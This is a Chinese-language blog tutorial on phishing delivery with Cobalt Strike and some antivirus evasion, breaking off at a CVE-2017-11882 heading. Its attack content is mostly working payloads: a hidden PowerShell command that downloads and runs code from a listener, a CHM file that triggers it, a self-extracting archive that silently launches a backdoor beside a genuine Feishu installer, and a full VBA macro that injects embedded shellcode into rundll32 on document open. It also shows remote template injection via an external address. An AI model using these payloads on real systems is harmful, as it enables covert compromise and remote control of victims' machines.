<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-钓鱼及部分免杀" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/11/%E9%92%93%E9%B1%BC%E5%8F%8A%E9%83%A8%E5%88%86%E5%85%8D%E6%9D%80/" class="article-date">
  <time class="dt-published" datetime="2023-01-11T12:09:00.000Z" itemprop="datePublished">2023-01-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/01/11/%E9%92%93%E9%B1%BC%E5%8F%8A%E9%83%A8%E5%88%86%E5%85%8D%E6%9D%80/">钓鱼及部分免杀</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Cobalt Strike 是一款美国 Red Team 开发的渗透测试神器，常被业界人称为 CS。它是一款以 Metasploit 为基础的 GUI 的框架式渗透工具，集成了端口转发、服务扫描、自动化溢出、多模式端口监听、Winexe 木马生成、Win dll 木马生成、Java 木马生成、office 宏病毒生成、木马捆绑等；钓鱼攻击包括：站点克隆、目标信息获取、Java 执行、浏览器自动攻击等。Cobalt Strike 项目的官网地址：<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com./">https://www.cobaltstrike.com。</a></p>
<p>在 Cobalt Strike 中，默认心跳为 60s（即 CS 与受害机默认 60s 才进行一次交互），故执行命令的响应速度很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显</p>
<p><strong>钓鱼往往需要免杀技术的支撑，但本章只讲述钓鱼和些许免杀技术</strong></p>
<p>需要用到kali，先看一下kali的ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">#ipconfig(dos命令)</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-1-1024x271.png" alt="img"></p>
<p>ip，255.255.255.0子网掩码，192.168.137.255广播地址</p>
<h2 id="开启CS"><a href="#开启CS" class="headerlink" title="开启CS"></a>开启CS</h2><p>先切换成root用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p>提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x teamserver</span><br></pre></td></tr></table></figure>

<p>打开teamserver，ip为kali的ip，yb.com是密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.137.128 yb.com</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-2-1024x319.png" alt="img"></p>
<p>然后在win10打开start.bat，用户名随便输（也可以在kali打开start.sh）</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-3-1024x336.png" alt="img"></p>
<p>主机就是kali的ip，端口默认，密码就是上面设置的密码</p>
<p>设置一个监听器</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-4-1024x770.png" alt="img"></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-5.png" alt="img"></p>
<h2 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h2><p>用 Cobalt Strike 生成命令</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-6.png" alt="img"></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-7.png" alt="img"></p>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.137.131:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>创建一个快捷方式，内容为上</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-8.png" alt="img"></p>
<p>将生成的powershell.exe放在靶机上，然后双击打开</p>
<p>成功获取shell</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-9-1024x762.png" alt="img"></p>
<h2 id="CHM帮助文档上线"><a href="#CHM帮助文档上线" class="headerlink" title="CHM帮助文档上线"></a>CHM帮助文档上线</h2><p>新建一个文件夹，名字随意，文件夹里面新建一个 index.html 文件并填入如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span><br><span class="line">width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&#x27;,calc.exe&#x27;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span><br><span class="line">width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX</span><br><span class="line">((new-object net.webclient).downloadstring(&#x27;http://192.168.137.131:80/a&#x27;))&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>EasyCHM 编译生成 CHM</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-10.png" alt="img"></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-11.png" alt="img"></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-12-1024x614.png" alt="img"></p>
<p>放到靶机上打开 CHM 帮助文档然后点击即可在 Cobalt Strike 上线（实战伪装的像一点 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42131443/article/details/112719415">https://blog.csdn.net/weixin_42131443/article/details/112719415</a></p>
<p>点击上线</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-13-1024x642.png" alt="img"></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-14-1024x734.png" alt="img"></p>
<h2 id="压缩文件自解压上线"><a href="#压缩文件自解压上线" class="headerlink" title="压缩文件自解压上线"></a>压缩文件自解压上线</h2><p>Cobalt Strike 生成 exe 可执行程序后门</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-15.png" alt="img"></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-16.png" alt="img"></p>
<p>把生成的 exe 后门和正常的 exe 文件自定义压缩（选中，添加到压缩文件），把两个文件选中后点击添加到压缩文件，然后点击创建自解压格式压缩文件</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-17.png" alt="img"></p>
<p>点击 高级-&gt;自解压选项</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-18.png" alt="img"></p>
<p>设置解压路径为 C:\Users\yb\Desktop\钓鱼</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-19.png" alt="img"></p>
<p>添加解压后运行的程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yb\Desktop\钓鱼\artifact.exe</span><br><span class="line">C:\Users\yb\Desktop\钓鱼\Feishu-win32_ia32-5.28.7-signed.exe</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-20.png" alt="img"></p>
<p>设置 模式-&gt; 静默模式-&gt; 全部隐藏</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-21.png" alt="img"></p>
<p>设置 更新模式为解压并更新文件 和 覆盖模式为 覆盖所有文件</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-22.png" alt="img"></p>
<p>最后设置压缩文件名进行压缩</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-23.png" alt="img"></p>
<p>在靶机上执行压缩出来的 exe 文件，此时飞书的安装程序会正常进行，而后门程序也悄悄启动</p>
<p>这个图标看起来有点假，改一下，工具：<code>ResourceHacker</code></p>
<p>图片转换为ico格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bitbug.net/</span><br></pre></td></tr></table></figure>

<h2 id="捆绑文件上线"><a href="#捆绑文件上线" class="headerlink" title="捆绑文件上线"></a>捆绑文件上线</h2><p>用 <code>超级文件捆绑（免杀增强版）.zp.exe</code> 可以把两个 exe 程序绑定在一起，启动一个 exe 程序就会启动另一个 exe 程序</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-24.png" alt="img"></p>
<p>把捆绑生成的 exe 文件放到靶机上执行，Cobalt Strike 会获取到目标 shell。</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-25.png" alt="img"></p>
<h2 id="Word上线宏语言编写的后门"><a href="#Word上线宏语言编写的后门" class="headerlink" title="Word上线宏语言编写的后门"></a>Word上线宏语言编写的后门</h2><h3 id="word"><a href="#word" class="headerlink" title="word"></a>word</h3><p>Cobalt Strike 生成宏语言编写的后门</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-26.png" alt="img"></p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-27.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,78,98,119,53,0,17,-116,127,123,-80,105,69,14,82,-44,122,-27,-53,42,104,60,-120,-108,98,52,-62,95,-18,-112,16,111,20,3,-63,71,-7,118, _</span><br><span class="line">-3,-22,-113,-31,-125,-89,-52,25,40,-126,37,-56,35,-42,-31,-114,-111,68,-116,68,8,87,-118,-94,-88,108,38,84,9,33,50,126,64,75,-38,65,-84,-107,-125,11, _</span><br><span class="line">-27,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,55,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,83,86,49,59,32,46,78,69,84,32,67,76,82,32,50, _</span><br><span class="line">46,48,46,53,48,55,50,55,41,13,10,0,-6,-89,42,91,59,-3,-74,-45,-22,-76,49,37,-71,-60,-58,-82,-103,-18,21,-74,78,117,-3,-116,107,114,-34,-97, _</span><br><span class="line">-10,45,42,10,-96,63,86,66,49,-94,88,-116,-29,-60,53,-85,40,-96,103,-106,10,36,-104,-4,48,35,60,-69,126,14,38,66,22,-43,82,99,-66,74,-59,32, _</span><br><span class="line">-88,3,97,-80,-22,21,26,52,0,-38,5,75,12,-64,-118,72,-97,-32,-76,9,103,34,-8,45,-78,-103,125,-63,123,5,-40,66,-122,22,-80,-81,-71,-86,-24,2, _</span><br><span class="line">27,66,76,-93,-28,126,-5,-15,51,106,19,-37,33,122,31,-9,49,-71,-93,-17,-67,112,-12,-18,53,11,-93,20,-97,-82,-17,15,-97,-57,60,74,-74,81,-106,-101, _</span><br><span class="line">-71,13,71,-39,-126,81,-88,-84,71,109,-71,-25,-28,-58,72,4,-8,-13,81,9,-95,-118,-94,29,-48,-34,34,-106,-41,-13,-111,18,24,72,-121,53,34,12,-26,-38, _</span><br><span class="line">-117,-58,100,-76,8,46,-67,41,52,-14,-102,-7,103,91,-7,-22,-86,-123,71,-116,-53,93,100,101,-57,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,57,50,46,49,54,56,46,49,51,55,46,49,51,49,0,18,52,86,120)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p>新建一个 word 文档，开启开发工具（文件-&gt;选项-&gt;自定义功能区-&gt;开发工具）</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-28-1024x820.png" alt="img"></p>
<p>开发工具-&gt;Visual Basic</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-29-1024x262.png" alt="img"></p>
<p>把上面生成的宏语言后门粘贴进去</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-30-1024x506.png" alt="img"></p>
<p>保存时点击对话框的“否”</p>
<p>另存为Word 97-2003 文档格式，保证低版本word可以打开</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-31-1024x683.png" alt="img"></p>
<p>用word打开，靶机上线</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-32-1024x469.png" alt="img"></p>
<h3 id="注入远程恶意word模板"><a href="#注入远程恶意word模板" class="headerlink" title="注入远程恶意word模板"></a>注入远程恶意word模板</h3><p>可以把恶意的word文件放到自己的vps上，然后通过word可以加载网络上的word模板的功能加载vps上的word文件，达到绕过一部分杀软的检测，因为靶机上的word文件的确是人畜无害的。</p>
<p>按前面正常的word钓鱼步骤，在另存时保存为dotm格式即启用宏的word模板</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-33-1024x293.png" alt="img"></p>
<p>放到vps上，用 python3 -m http.server 8080 （python2: python -m SimpleHTTPServer 8080）开启简易web服务，确保靶机上用 <a target="_blank" rel="noopener" href="http://vpsip:8080/dy.dotm">http://vpsip:8080/dy.dotm</a> 能访问到</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-34.png" alt="img"></p>
<p>打开word，加载模板创建一个word文件</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-35-1024x616.png" alt="img"></p>
<p>保存为docx格式，然后把生成的word文件后缀改为zip格式然后解压得到如下目录</p>
<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-36.png" alt="img"></p>
<p>打开 word&#x2F;_rels&#x2F;settings.xml.rels 文件，把Target字段内容改为dotm文件对应ur</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;http://49.0.251.11:8080/1.dotm&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt;</span><br></pre></td></tr></table></figure>

<p>把word文件压缩为zip，然后后缀改为docx</p>
<p>放在靶机上执行，启用宏，靶机会在 Cobalt Strike 上线</p>
<h3 id="CVE-2017-11882"><a href="#CVE-2017-11882" class="headerlink" title="CVE-2017-11882"></a>CVE-2017-11882</h3><p>栈溢出漏洞</p>
<p>可用版本如下：</p>
